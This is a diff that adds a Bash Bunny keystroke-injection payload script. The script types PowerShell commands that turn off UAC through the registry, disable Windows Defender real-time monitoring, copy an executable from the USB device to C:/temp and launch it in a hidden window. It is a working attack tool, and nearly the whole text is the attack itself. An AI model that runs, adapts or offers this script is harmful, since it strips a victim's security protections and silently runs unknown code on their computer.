@@ -1,0 +1,16 @@
+REM made by YHUSS-SEC
+REM (will attempt to create a powershell session and deactivate UAC and windows AV)
+
+DELAY 400
+STRING Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 0
+ENTER
+DELAY 400
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 400
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name;cp .\payloads\switch1\main.exe "C:/temp"
+ENTER
+DELAY400
+STRING powershell Start-Process powershell.exe -windowstyle hidden "C:/temp/main.exe"
+ENTER
+EXIT
